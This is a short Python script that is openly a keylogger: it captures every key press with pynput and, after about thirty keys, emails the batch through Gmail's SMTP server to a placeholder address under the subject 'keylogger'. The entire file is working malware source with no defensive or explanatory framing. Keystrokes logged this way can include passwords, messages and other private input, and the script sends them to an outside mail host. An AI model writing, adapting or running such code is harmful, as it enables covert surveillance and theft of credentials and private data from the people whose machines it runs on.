from pynput.keyboard import Listener
import smtplib


def send_mail(tosend):
    sender = "sender@gmail.com"
    receiver = "receiver@gmail.com"
    password = "senderpassword"
    subject = "keylogger"
    body=tosend
    
    # header
    message = f"""From: {sender}
    To: {receiver}
    Subject: {subject}\n
    {body}
    """

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    try:
        server.login(sender,password)
        print("Logged in...")
        server.sendmail(sender, receiver, message)
        print("Email has been sent!")
        

    except smtplib.SMTPAuthenticationError:
        print("unable to sign in")

def keylogger():
    charact=[] 
    
    def write_text(key):
        if len(charact)<30:
            charact.append(str(key))
        else:
            charact.append(str(key))
            tosend=' '
            for i in range(30):
                tosend += ''+charact[i]
            charact.clear()
            send_mail(tosend)
    
    with Listener(on_press=write_text) as l :
        l.join()
keylogger()